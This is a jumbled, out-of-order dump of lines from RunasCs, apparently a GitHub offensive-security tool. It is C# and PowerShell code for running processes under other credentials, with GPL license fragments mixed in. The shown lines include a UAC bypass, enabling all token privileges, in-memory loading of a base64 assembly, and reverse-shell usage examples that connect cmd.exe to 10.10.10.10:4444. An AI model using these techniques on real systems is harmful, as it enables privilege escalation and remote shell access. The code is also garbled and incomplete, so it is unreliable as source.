    
        
            
                
                    
                            0 - CreateProcessAsUserW
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
                            CloseHandle(hTokenCheck2)
                            CreateProcess function to use. When not specified
                            If you set 0 no output will be retrieved and a
                            If you set 0 no output will be retrieved and a 
                            Preamble
                            RunasCs determines an appropriate CreateProcess
                            This will ensure the process will have the
                            This will halt RunasCs until the spawned process
                            Using this option sets the process_timeout to 0.
                            availableLogonType = logonTypeTry
                            background process will be created.
                            break
                            directory in the C:
                            ends and sent the output back to the caller.
                            environment variables correctly set.
                            force the creation of the user profile on the machine.
                            function automatically according to your privileges.
                            logged on user to the main thread.
                            spawn a new process and assign the token of the
                            spawn a new process and assign the token of the 
                            the logon type for the token of the new process.
                            the waiting time (in ms) for the created process.
                            token limitations (not filtered).
                            try a UAC bypass to spawn a process without
                        availableLogonType = logonTypeTry
                        break
                        bypassUac = true
                        createProcessFunction = ValidateCreateProcessFunction(args[
                        domain = args[
                        forceUserProfileCreation = true
                        if (AccessToken.GetTokenIntegrityLevel(hTokenCheck2) > AccessToken.IntegrityLevel.Medium)
                        logonType = ValidateLogonType(args[
                        positionals.Add(args[ctr])
                        processTimeout = ValidateProcessTimeout(args[
                        remote = ValidateRemote(args[
                        remoteImpersonation = true
                        {
                        }
                       TERMS AND CONDITIONS
                     END OF TERMS AND CONDITIONS
                    DESKTOP_ENUMERATE 
                    DESKTOP_HOOKCONTROL 
                    GNU GENERAL PUBLIC LICENSE
                    IntPtr hTokenCheck2 = IntPtr.Zero
                    default:
                    err = Marshal.GetLastWin32Error()
                    if (hTokenCheck2 != IntPtr.Zero) CloseHandle(hTokenCheck2)
                    }
                   READ_CONTROL            
                   WINSTA_CREATEDESKTOP    
                   WINSTA_ENUMERATE        
                   WINSTA_READATTRIBUTES   
                   WINSTA_WRITEATTRIBUTES  
                   WRITE_OWNER)
                // Add the ACE to the new ACL.
                // Get an ACE.
                // High Integrity
                // Medium Integrity
                // System Integrity
                IntPtr pTempAce = IntPtr.Zero
                SeAssignPrimaryTokenPrivilegeAssigned = true
                SeImpersonatePrivilegeAssigned = true
                Sid = new byte[cbSid]
                createProcessFunction = 1
                else
                else if (createProcessFunction == 1)
                err = NO_ERROR
                error 
                foreach (int logonTypeTry in logonTypeTryOrder)
                if (availableLogonType != 0)
                if (bypassUac)
                if (createProcessFunction == 0)
                int availableLogonType = 0
                isLimitedUserLogon = true
                logonFlags = LOGON_WITH_PROFILE
                logonTypeBypassUac = LOGON32_LOGON_NETWORK_CLEARTEXT
                logonTypeBypassUac = logonType
                logonTypeNotFiltered = LOGON32_LOGON_BATCH
                logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT
                logonTypeNotFiltered = LOGON32_LOGON_SERVICE
                output 
                referencedDomainName.EnsureCapacity((int)cchReferencedDomainName)
                return IntegrityLevel.High
                return IntegrityLevel.Low
                return IntegrityLevel.Medium
                return IntegrityLevel.System
                switch (args[ctr])
                tokenIsFiltered = true
                {
                }
            -----------
            // Copy the ACEs to the new DACL.
            // we load the user profile only if it has been already created or the creation is forced from the flag --force-profile
            // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon 
            0 - CreateProcessAsUserW
            0: CreateProcessAsUserW()
            1 - CreateProcessWithTokenW
            1: CreateProcessWithTokenW()
            2 - CreateProcessWithLogonW
            2: CreateProcessWithLogonW()
            AccessToken.IntegrityLevel userTokenIL = AccessToken.GetTokenIntegrityLevel(hToken)
            AddAceToDesktop()
            AddAceToWindowStation()
            Author: @splinter_code
            CloseHandle(hOutputReadTmpLocal)
            CloseHandle(hTokenUacCheck)
            CloseHandle(this.hErrorWrite)
            CloseHandle(this.hOutputWrite)
            Commandline for the process
            Console.Out.Write(help)
            CreateProcess function to use. When not specified
            Description
            Force the creation of the user profile on the machine.
            How to Apply These Terms to Your New Programs
            If you set 0 no output will be retrieved and a 
            ImpersonateLoggedOnUser(this.hTokenPreviousImpersonatingThread)
            IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle
            IntPtr hTokenUacCheck = new IntPtr(0)
            IntPtr pSid = Marshal.ReadIntPtr(pb)
            IntPtr ptrLuid = Marshal.AllocHGlobal(Marshal.SizeOf(luid))
            IntPtr tokenElevationTypePtr = Marshal.AllocHGlobal(tokenInfLength)
            LUID luid = new LUID()
            License: GPL-3.0
            Marshal.FreeHGlobal(tokenElevationPtr)
            Marshal.FreeHGlobal(tokenElevationTypePtr)
            PS>Invoke-RunasCs -Username user1 -Password password1 -Command cmd.exe -Remote 10.10.10.24:4444
            Remote host in host:port format.
            Run a background process as a local user
            Run a command as a domain user and logon type as NetworkCleartext (8)
            Run a command as a specific local user
            Run a command as an Administrator bypassing UAC
            Run a command as an Administrator through remote impersonation
            Run a command simulating the /netonly flag of runas.exe 
            RunasCs determines an appropriate CreateProcess
            RunasCs is an utility to run specific processes with different permissions
            Source: https://github.com/antonioCoco/RunasCs
            Spawn a new process and assign the token of the 
            StringBuilder profileDir = new StringBuilder(dwSize)
            StringBuilder sb = new StringBuilder()
            The logon type for the spawned process.
            The password of the user
            The username of the user
            The waiting time (in ms) for the created process.
            This will ensure the process will have the
            This will halt RunasCs until the spawned process
            Try a UAC bypass to spawn a process without
            UInt32 PIPE_NOWAIT = 0x00000001
            background process will be created.
            bool userProfileExists
            cbDacl = 0
            cbDacl = aclSizeInfo.AclBytesInUse
            cbNewDacl =  8 
            cbNewDacl = cbDacl 
            createProcessFunction = 0
            createProcessFunction = Convert.ToInt32(function)
            directory in the C:
            else
            else if (!isLimitedUserLogon 
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID 
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
            ends and sent the output back to the caller.
            environment variables correctly set.
            err = Marshal.GetLastWin32Error()
            error 
            error = WSAGetLastError()
            for (int dwIndex = 0
            for(int ctr = 0
            fqan = domain 
            fqan = username
            function automatically according to your privileges.
            hOutputReadTmpLocal = IntPtr.Zero
            if (!SetProcessWindowStation(hWinstaSave))
            if (!SetProcessWindowStation(this.hWinsta))
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            if (Marshal.GetLastWin32Error() == ERROR_LOGON_TYPE_NOT_GRANTED) {
            if (Result == false)
            if (SeImpersonatePrivilegeAssigned)
            if (createProcessFunction == 2)
            if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
            if (err == ERROR_INSUFFICIENT_BUFFER 
            if (hTokenBatch != IntPtr.Zero) CloseHandle(hTokenBatch)
            if (hTokenNetwork != IntPtr.Zero) CloseHandle(hTokenNetwork)
            if (hTokenService != IntPtr.Zero) CloseHandle(hTokenService)
            if (logonType != LOGON32_LOGON_INTERACTIVE)
            if (logonType != LOGON32_LOGON_NEW_CREDENTIALS 
            if (logonType == LOGON32_LOGON_NETWORK 
            if (remoteImpersonation)
            if (result == false 
            if (this.hWinsta == IntPtr.Zero)
            if (tokenElevationType.TokenElevationType == 3)  // 3 = TokenElevationTypeLimited
            if (userProfileExists 
            if( !logonTypes.ContainsKey(logonType) ) {
            if( createProcessFunction < 0 
            int dwSize = 0
            int logonTypeBypassUac
            int luidNameLen = 0
            int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId
            invoker.CleanupHandles()
            isLimitedUserLogon = true
            logged on user to the main thread.
            logonProvider = LOGON32_PROVIDER_WINNT50
            logonType = Convert.ToInt32(type)
            logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT
            luid = TokenPrivileges.Privileges[i].Luid
            output 
            port = Convert.ToInt32(remote[1])
            privilegeStatus[0]=sb.ToString()
            privilegeStatus[1]=convertAttributeToString(TokenPrivileges.Privileges[i].Attributes)
            privileges.Add(privilegeStatus)
            processTimeout = 0
            processTimeout = Convert.ToUInt32(timeout)
            profileInfo.dwSize = Marshal.SizeOf(profileInfo)
            profileInfo.lpUserName = username
            result = false
            ret = true
            return IntegrityLevel.Unknown
            return false
            return true
            sb.EnsureCapacity(luidNameLen 
            socketLocal = ConnectRemote(remote)
            startupInfo.dwFlags = Startf_UseStdHandles
            startupInfo.hStdError = hErrorWriteLocal
            startupInfo.hStdError = socketLocal
            startupInfo.hStdInput = socketLocal
            startupInfo.hStdOutput = hOutputWriteLocal
            startupInfo.hStdOutput = socketLocal
            string privilege = s[0]
            string[] privilegeStatus = new string[2]
            than the user's current logon provides using explicit credentials.
            this.hErrorWrite = IntPtr.Zero
            this.hOutputWrite = IntPtr.Zero
            this.hTokenPreviousImpersonatingThread = WindowsIdentity.GetCurrent(true).Token
            throw new RunasCsException(error 
            throw new RunasCsException(error)
            to the specified host. The process timeout
            token limitations (not filtered).
            tokenInfLength = 0
            tokenIsFiltered = false
            uint logonFlags = 0
            userSid = Marshal.AllocHGlobal((int)cbSid)
            will be set to 0 if not specified explicitly.
            {
            }
         public Int16 cbReserved2
         public Int16 wShowWindow
         public Int32 cb
         public Int32 dwFillAttribute
         public Int32 dwFlags
         public Int32 dwX
         public Int32 dwXCountChars
         public Int32 dwXSize
         public Int32 dwY
         public Int32 dwYCountChars
         public Int32 dwYSize
         public IntPtr hStdError
         public IntPtr hStdInput
         public IntPtr hStdOutput
         public IntPtr lpReserved2
         public string lpDesktop
         public string lpReserved
         public string lpTitle
        $RemoteImpersonation
        $parametersRunasCs.add($CreateProcessFunction)
        $parametersRunasCs.add($Remote)
        .EXAMPLE
        .EXAMPLE  
        .PARAMETER BypassUac
        .PARAMETER Command
        .PARAMETER CreateProcessFunction
        .PARAMETER Domain
        .PARAMETER ForceProfile
        .PARAMETER LogonType
        .PARAMETER Password
        .PARAMETER ProcessTimeout
        .PARAMETER Remote
        .PARAMETER RemoteImpersonation
        .PARAMETER Username
        .SYNOPSIS
        //  Set the new security descriptor for the desktop object.
        // Add a new ACE to the new DACL.
        // Allocate memory for the new DACL.
        // Allocate memory for the new security descriptor.
        // Assign the new DACL to the new security descriptor.
        // Compute the size of a DACL to be added to the new security descriptor.
        // Enable SeAssignPrimaryTokenPrivilege on our current process needed by the kernel to make the CreateProcessAsUserW call
        // Enable SeImpersonatePrivilege on our current process needed by the seclogon to make the CreateProcessWithTokenW call
        // Enable all privileges for the token of the new process
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        // Get the DACL from the security descriptor.
        // Get the size information of the DACL.
        // Initialize the new DACL.
        // Initialize the new security descriptor.
        // Obtain the security descriptor for the desktop object.
        // Use the proper CreateProcess
        // add the proper DACL on the window station and desktop that will be used
        // enable all privileges assigned to the token
        // here we set the IL of the new token equal to our current process IL. Needed or seclogon will fail.
        // if our main thread was already impersonating remember to restore the previous thread token
        // remove acl to our current process. Needed for seclogon
        // setup proper logon provider for new credentials (9) logons
        // setup the std handles for the process based on the user input
        // this should be avoided with the LOGON32_LOGON_NEW_CREDENTIALS logon type or some bug can happen in LookupAccountName()
        // this will solve some permissions errors when attempting to get the current process handle while impersonating
        //Get TokenInformation length in TokenInfLength
        //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
        ACCESS_ALLOWED_ACE pNewAceStruct = new ACCESS_ALLOWED_ACE()
        ACE_HEADER AceHeader = new ACE_HEADER()
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION()
        AccessToken.EnableAllPrivileges(hTokenDupImpersonation)
        AccessToken.EnableAllPrivileges(hTokenDuplicate)
        AceHeader.AceFlags = aceFlags
        AceHeader.AceSize = (short)aceSize
        AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE
        AclSizeInformation = 2
        CloseHandle(hToken)
        CloseHandle(hTokenDupImpersonation)
        CloseHandle(hTokenDuplicate)
        CloseHandle(hTokenProcess)
        CloseHandle(processInfo.process)
        CloseHandle(processInfo.thread)
        Console.Out.Flush()
        Console.Out.Write(RunasCsMainClass.RunasCsMain(args))
        DESKTOP_ALL = (DESKTOP_READOBJECTS 
        GENERIC_ACCESS = GENERIC_READ 
        IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenInfLength) 
        IntPtr currentTokenHandle = WindowsIdentity.GetCurrent().Token
        IntPtr hErrorWriteLocal = IntPtr.Zero
        IntPtr hOutputReadLocal = IntPtr.Zero
        IntPtr hOutputReadTmpLocal = IntPtr.Zero
        IntPtr hOutputWriteLocal = IntPtr.Zero
        IntPtr hToken = IntPtr.Zero
        IntPtr hToken = new IntPtr(0)
        IntPtr hTokenBatch = IntPtr.Zero
        IntPtr hTokenCheck1 = IntPtr.Zero
        IntPtr hTokenDupImpersonation = IntPtr.Zero
        IntPtr hTokenDuplicate
        IntPtr hTokenDuplicate = IntPtr.Zero
        IntPtr hTokenDuplicateLocal = new IntPtr(0)
        IntPtr hTokenNetwork = IntPtr.Zero
        IntPtr hTokenProcess = IntPtr.Zero
        IntPtr hTokenService = IntPtr.Zero
        IntPtr hWinstaSave = GetProcessWindowStation()
        IntPtr lpEnvironment = IntPtr.Zero
        IntPtr pDacl = IntPtr.Zero
        IntPtr pLabel
        IntPtr pLabelAuthorityStruct
        IntPtr pNewAcePtr = Marshal.AllocHGlobal((int)aceSize)
        IntPtr pNewDacl = IntPtr.Zero
        IntPtr pNewSd = IntPtr.Zero
        IntPtr pSID
        IntPtr pSd = IntPtr.Zero
        IntPtr pb = Marshal.AllocHGlobal(1000)
        IntPtr sidStartPtr = new IntPtr(pNewAcePtr.ToInt64() 
        IntPtr socket = IntPtr.Zero
        IntPtr socketLocal = IntPtr.Zero
        IntPtr tokenElevationPtr = Marshal.AllocHGlobal(tokenInfLength)
        IntPtr userSid = IntPtr.Zero
        IntegrityLevel illevel = IntegrityLevel.Unknown
        LUID sebLuid = new LUID()
        List<string> positionals = new List<string>()
        List<string[]> privileges = new List<string[]>()
        List<string[]> privs = new List<string[]>()
        Marshal.FreeHGlobal(pLabel)
        Marshal.FreeHGlobal(pLabelAuthorityStruct)
        Marshal.FreeHGlobal(pNewAcePtr)
        Marshal.FreeHGlobal(pNewDacl)
        Marshal.FreeHGlobal(pNewSd)
        Marshal.FreeHGlobal(pSID)
        Marshal.FreeHGlobal(pSd)
        Marshal.FreeHGlobal(pb)
        MaxTokenInfoClass
        PROFILEINFO profileInfo = new PROFILEINFO()
        PROTECTED_DACL_SECURITY_INFORMATION   = 0x80000000
        ProcessInformation processInfo = new ProcessInformation()
        ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID
        ResumeThread(processInfo.thread)
        RevertToSelf()
        RevertToSelfCustom()
        RunasCs invoker = new RunasCs()
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES()
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION
        SE_GROUP_LOGON_ID = 0xC0000000
        SE_REGISTRY_WOW64_32KEY
        SID_IDENTIFIER_AUTHORITY authoritySid = new SID_IDENTIFIER_AUTHORITY()
        SID_NAME_USE sidUse
        SOCKADDR_IN sockinfo = new SOCKADDR_IN()
        STARTUPINFO startupInfo = new STARTUPINFO()
        SecurityDelegation
        SidTypeComputer
        StringBuilder referencedDomainName = new StringBuilder()
        TOKEN_ADJUST_PRIVILEGES 
        TOKEN_ADJUST_SESSIONID)
        TOKEN_DUPLICATE 
        TOKEN_MANDATORY_LABEL tokenLabel = new TOKEN_MANDATORY_LABEL()
        TOKEN_PRIVILEGES_2 tokenp = new TOKEN_PRIVILEGES_2()
        WINSTA_ALL =  (WINSTA_ACCESSCLIPBOARD  
        WSAData data
        [MarshalAs(UnmanagedType.LPTStr)]
        [Parameter()]
        [String]
        [Switch]
        authoritySid.Value = MANDATORY_LABEL_AUTHORITY
        bool Result
        bool SeAssignPrimaryTokenPrivilegeAssigned = false
        bool SeImpersonatePrivilegeAssigned = false
        bool fDaclExist = false
        bool fDaclPresent = false
        bool isLimitedUserLogon = false
        bool isTokenUACFiltered = false
        bool result = false
        bool ret = false
        bool tokenIsFiltered = false
        byte [] Sid = null
        byte[] buffer = new byte[BUFFER_SIZE_PIPE]
        byte[] stationNameBytes = new byte[256]
        catch {
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) 
        cmd = positionals[2]
        else
        else 
        else if (bypassUac)
        else if (remote != null)
        else {
        else{
        for(int i=0
        foreach (string privilege in privileges)
        foreach (string[] s in privs)
        hErrorWrite = hErrorWriteLocal
        hOutputRead = hOutputReadLocal
        hOutputWrite = hOutputWriteLocal
        hTokenDuplicate = hTokenDuplicateLocal
        if (!result)
        if (AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation))
        if (GetTokenIntegrityLevel(hToken) >= IntegrityLevel.High)
        if (Result == false)
        if (SeAssignPrimaryTokenPrivilegeAssigned)
        if (WindowsIdentity.GetCurrent(true) != null)
        if (args.Length == 1 
        if (err == 0)
        if (fDaclPresent)
        if (forceProfileCreation 
        if (hTokenCheck1 != IntPtr.Zero) CloseHandle(hTokenCheck1)
        if (isTokenUACFiltered)
        if (logonType != 9)
        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS) logonProvider = LOGON32_PROVIDER_WINNT50
        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS) {
        if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment)
        if (pDacl == IntPtr.Zero)
        if (processTimeout > 0)
        if (processTimeout > 0) {
        if (remoteImpersonation)
        if (result 
        if (result == false)
        if (this.hTokenPreviousImpersonatingThread != IntPtr.Zero) 
        if (tokenElevation.TokenIsElevated > 0) {
        if( WSAStartup(2 << 8 
        if( positionals.Count < 3 ) {
        if( remote != null ) {
        if( split.Length != 2 ) {
        if(AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal))
        if(attribute == 0)
        if(attribute == 1)
        if(attribute == 2)
        if(attribute == 3)
        if(cbDacl == 0)
        if(createProcessFunction == 0)
        if(createProcessFunction == 1)
        if(hWinstaSave == IntPtr.Zero)
        if(this.hDesktop != IntPtr.Zero) CloseDesktop(this.hDesktop)
        if(this.hErrorWrite != IntPtr.Zero) CloseHandle(this.hErrorWrite)
        if(this.hOutputRead != IntPtr.Zero) CloseHandle(this.hOutputRead)
        if(this.hOutputWrite != IntPtr.Zero) CloseHandle(this.hOutputWrite)
        if(this.hWinsta != IntPtr.Zero) CloseWindowStation(this.hWinsta)
        if(this.socket != IntPtr.Zero) closesocket(this.socket)
        if(this.stationDaclObj != null) this.stationDaclObj.CleanupHandles()
        if(this.userSid != IntPtr.Zero) FreeSid(this.userSid)
        int createProcessFunction = 2
        int createProcessFunction:
        int err = NO_ERROR
        int error = 0
        int labelSize
        int logonProvider = LOGON32_PROVIDER_DEFAULT
        int logonType = 3
        int logonTypeNotFiltered = 0
        int offset = Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) - Marshal.SizeOf(typeof(uint))
        int port = 0
        int tokenInfLength = 0
        internal IntPtr lpVendorInfo
        internal short iMaxSockets
        internal short iMaxUdpDg
        internal short wHighVersion
        internal short wVersion
        internal string szDescription
        internal string szSystemStatus
        isTokenUACFiltered = AccessToken.IsFilteredUACToken(hToken)
        labelSize = Marshal.SizeOf(tokenLabel)
        logonTypeNotFiltered = 0
        lpDesktop = stationName 
        lpEnvironment = new IntPtr(0)
        output 
        pLabel = Marshal.AllocHGlobal(labelSize)
        pLabelAuthorityStruct = Marshal.AllocHGlobal(Marshal.SizeOf(authoritySid))
        pNewAceStruct.Header = AceHeader
        pNewAceStruct.Mask = mask
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl)
        pNewSd = Marshal.AllocHGlobal((int)cbSd)
        pSd = Marshal.AllocHGlobal((int)cbSd)
        password = positionals[1]
        privs = AccessToken.GetTokenPrivileges(currentTokenHandle)
        public ACCESS_MASK Mask
        public ACE_HEADER Header
        public Int32 HighPart
        public IntPtr hProfile
        public IntPtr lpSecurityDescriptor
        public IntPtr pSID
        public IntPtr process
        public IntPtr thread
        public LUID Luid
        public LUID_AND_ATTRIBUTES[] Privileges
        public SID_AND_ATTRIBUTES Label
        public String lpDefaultPath
        public String lpPolicyPath
        public String lpProfilePath
        public String lpServerName
        public String lpUserName
        public TokenGroupAttributes Attributes
        public UInt32 Attributes
        public UInt32 LowPart
        public UInt32 PrivilegeCount
        public UInt32 TokenElevationType
        public UInt32 TokenIsElevated
        public bool   bInheritHandle
        public byte AceFlags
        public byte AceType
        public byte[] Value
        public int    Length
        public int    processId
        public int    threadId
        public int PrivilegeCount
        public int dwFlags
        public int dwSize
        public long sin_zero
        public short AceSize
        public short sin_family
        public short sin_port
        public uint AceCount
        public uint AclBytesFree
        public uint AclBytesInUse
        public uint SidStart
        public uint sin_addr
        result = ImpersonateLoggedOnUser(hTokenDuplicateLocal)
        return commandlineRet
        return createProcessFunction
        return createProcessFunctions
        return errorMessage
        return false
        return illevel
        return isLimitedUserLogon
        return logonType
        return logonTypes
        return lpDesktop
        return output
        return privileges
        return processTimeout
        return result
        return ret
        return socket
        return split
        return tokenIsFiltered
        return userSid
        sa.Length = Marshal.SizeOf(sa)
        sa.bInheritHandle = true
        sa.lpSecurityDescriptor = IntPtr.Zero
        socket = socketLocal
        sockinfo.sin_family = (short)2
        sockinfo.sin_port = (short)htons((ushort)port)
        startupInfo.cb = Marshal.SizeOf(startupInfo)
        startupInfo.lpDesktop = desktopName
        startupInfo.lpReserved = null
        string commandLine = ParseCommonProcessesInCommandline(cmd)
        string commandlineRet = commandline
        string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message
        string host = remote[0]
        string[] args = commandline.Split(' ')
        string[] remote = null
        string[] split = remote.Split(':')
        this.CleanupHandles()
        this.hDesktop = IntPtr.Zero
        this.hErrorWrite = IntPtr.Zero
        this.hErrorWrite = new IntPtr(0)
        this.hOutputRead = IntPtr.Zero
        this.hOutputRead = new IntPtr(0)
        this.hOutputWrite = IntPtr.Zero
        this.hOutputWrite = new IntPtr(0)
        this.hTokenPreviousImpersonatingThread = IntPtr.Zero
        this.hTokenPreviousImpersonatingThread = new IntPtr(0)
        this.hWinsta = IntPtr.Zero
        this.socket = IntPtr.Zero
        this.socket = new IntPtr(0)
        this.stationDaclObj = new WindowStationDACL()
        this.stationDaclObj = null
        this.userSid = IntPtr.Zero
        tokenLabel.Label.Attributes = TokenGroupAttributes.SE_GROUP_INTEGRITY
        tokenLabel.Label.pSID = pSID
        tokenp.Attributes = SE_PRIVILEGE_ENABLED
        tokenp.Luid = sebLuid
        tokenp.PrivilegeCount = 1
        try
        try {
        uint TokenInfLength=0
        uint cb = 1000
        uint cbDacl = 0
        uint cbNewAce = 0
        uint cbNewDacl = 0
        uint cbSd = 0
        uint cbSid = 0
        uint cchReferencedDomainName = (uint)referencedDomainName.Capacity
        uint dwBytesRead = 0
        uint lengthNeeded = 0
        uint processTimeout = 120000
        username = password = cmd = domain = string.Empty
        username = positionals[0]
        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(hToken))
        {
        }
        } 
        } catch {
        } catch(RunasCsException e) {
        } catch(System.IndexOutOfRangeException) {
        } else {
    $RunasCsBytes = [System.Convert]::FromBase64String($RunasCsBase64)
    $output = [RunasCsMainClass]::RunasCsMain($parametersRunasCs.ToArray())
    $parametersRunasCs = New-Object Collections.Generic.List[string]
    $parametersRunasCs.add($Command)
    $parametersRunasCs.add($Domain)
    $parametersRunasCs.add($LogonType)
    $parametersRunasCs.add($Password)
    $parametersRunasCs.add($ProcessTimeout)
    $parametersRunasCs.add($Username)
    (
    (at your option) any later version.
    )
    /
    // Mandatory Label SIDs (integrity levels)
    // UAC bypass discussed in this UAC quiz tweet --> https://twitter.com/splinter_code/status/1458054161472307204
    // thanks @winlogon0 --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
    // thanks @winlogon0 for the implementation --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
    //Big thanks to Vanara project
    //https://github.com/dahall/Vanara/blob/9771eadebc874cfe876011c9d6588aefb62626d9/PInvoke/Security/AdvApi32/SecurityBaseApi.cs
    7.  This requirement modifies the requirement in section 4 to
    <
    <one line to give the program's name and a brief idea of what it does.>
    <program>  Copyright (C) <year>  <name of author>
    Appropriate Legal Notices
    Copyright (C) <year>  <name of author>
    Corresponding Source along with the object code.  If the place to
    Corresponding Source fixed on a durable physical medium
    Corresponding Source from a network server at no charge.
    Corresponding Source in the same way through the same place at no
    Corresponding Source.  Regardless of what server hosts the
    GNU General Public License for more details.
    License to anyone who comes into possession of a copy.  This
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Notices displayed by works containing it
    Param
    Run a command as a domain user and logon type as NetworkCleartext (8)
    Run a command as a local user
    Run a command as an Administrator bypassing UAC
    Run a command as an Administrator through remote impersonation
    Run a command simulating the /netonly flag of runas.exe
    Run a command simulating the /netonly flag of runas.exe 
    RunasCs is an utility to run specific processes under a different user account
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]
    Source of the work are being offered to the general public at no
    This program comes with ABSOLUTELY NO WARRANTY
    This program is free software: you can redistribute it and/or modify
    Write-Output $output
    You should have received a copy of the GNU General Public License
    [Flags]
    [Flags] 
    [Reflection.Assembly]::Load($RunasCsBytes) 
    [StructLayout(LayoutKind.Sequential)]
    [StructLayout(LayoutKind.Sequential)] 
    [return: MarshalAs(UnmanagedType.Bool)]
    a) Disclaiming warranty or limiting liability differently from the
    a) The work must carry prominent notices stating that you modified
    any liability that these contractual assumptions directly impose on
    author attributions in that material or in the Appropriate Legal
    authors of the material
    available for as long as needed to satisfy these requirements.
    b) Requiring preservation of specified reasonable legal notices or
    b) The work must carry prominent notices stating that it is
    but WITHOUT ANY WARRANTY
    by specifying explicit credentials. In contrast to the default runas.exe command
    c) Convey individual copies of the object code with a copy of the
    charge under subsection 6d.
    clear directions next to the object code saying where to find the
    cmd                     commandline for the process
    copy of the Corresponding Source for all the software in the
    customarily used for software interchange.
    d) Convey the object code by offering access from a designated
    d) Limiting the use for publicity purposes of names of licensors or
    e) Declining to grant rights under trademark law for use of some
    f) Requiring indemnification of licensors and authors of that
    further charge.  You need not require recipients to copy the
    if( $PSBoundParameters.ContainsKey('BypassUac') ) {
    if( $PSBoundParameters.ContainsKey('CreateProcessFunction') ) {
    if( $PSBoundParameters.ContainsKey('ForceProfile') ) {
    if( $PSBoundParameters.ContainsKey('Remote') ) {
    if( $PSBoundParameters.ContainsKey('RemoteImpersonation') ) {
    invalidate such permission if you have separately received it.
    it supports different logon types and CreateProcess
    it under the terms of the GNU General Public License as published by
    long as you offer spare parts or customer support for that product
    material by anyone who conveys the material (or modified versions of
    may be on a different server (operated by you or a third party)
    more than your reasonable cost of physically performing this
    on your current permissions. Furthermore it allows input/output redirection (even
    password                password of the user
    private IntPtr ConnectRemote(string[] remote)
    private IntPtr hDesktop
    private IntPtr hErrorWrite
    private IntPtr hOutputRead
    private IntPtr hOutputWrite
    private IntPtr hTokenPreviousImpersonatingThread
    private IntPtr hWinsta
    private IntPtr socket
    private IntPtr userSid
    private WindowStationDACL stationDaclObj
    private const Int32 Startf_UseStdHandles = 0x00000100
    private const UInt32 LOGON_NETCREDENTIALS_ONLY = 2
    private const UInt32 LOGON_WITH_PROFILE = 1
    private const byte ACCESS_ALLOWED_ACE_TYPE = 0x0
    private const byte CONTAINER_INHERIT_ACE = 0x2
    private const byte INHERIT_ONLY_ACE = 0x8
    private const byte NO_PROPAGATE_INHERIT_ACE = 0x4
    private const byte OBJECT_INHERIT_ACE = 0x1
    private const int BUFFER_SIZE_PIPE = 1048576
    private const int ERROR_INSUFFICIENT_BUFFER = 122
    private const int ERROR_INVALID_FLAGS = 1004
    private const int ERROR_LOGON_TYPE_NOT_GRANTED = 1385
    private const int GetCurrentProcess = -1
    private const int LOGON32_LOGON_BATCH = 4
    private const int LOGON32_LOGON_INTERACTIVE = 2
    private const int LOGON32_LOGON_NETWORK = 3
    private const int LOGON32_LOGON_NETWORK_CLEARTEXT = 8
    private const int LOGON32_LOGON_NEW_CREDENTIALS = 9
    private const int LOGON32_LOGON_SERVICE = 5
    private const int LOGON32_PROVIDER_DEFAULT = 0
    private const int LOGON32_PROVIDER_WINNT50 = 3
    private const int NO_ERROR = 0
    private const int SECURITY_MANDATORY_HIGH_RID = 0x3000
    private const int SECURITY_MANDATORY_LOW_RID = 0x1000
    private const int SECURITY_MANDATORY_MEDIUM_RID = 0x2000
    private const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x5000
    private const int SECURITY_MANDATORY_SYSTEM_RID = 0x4000
    private const int SECURITY_MANDATORY_UNTRUSTED_RID = 0
    private const int TokenImpersonation = 2
    private const int TokenPrimary = 1
    private const int UOI_NAME = 2
    private const uint ACL_REVISION = 2
    private const uint CREATE_NO_WINDOW = 0x08000000
    private const uint CREATE_SUSPENDED = 0x00000004
    private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400
    private const uint DACL_SECURITY_INFORMATION = 0x00000004
    private const uint DUPLICATE_SAME_ACCESS = 0x00000002
    private const uint MAXDWORD = 0xffffffff
    private const uint SECURITY_DESCRIPTOR_REVISION = 1
    private const uint SE_PRIVILEGE_ENABLED = 0x00000002
    private enum ACCESS_MASK : uint
    private enum ACL_INFORMATION_CLASS
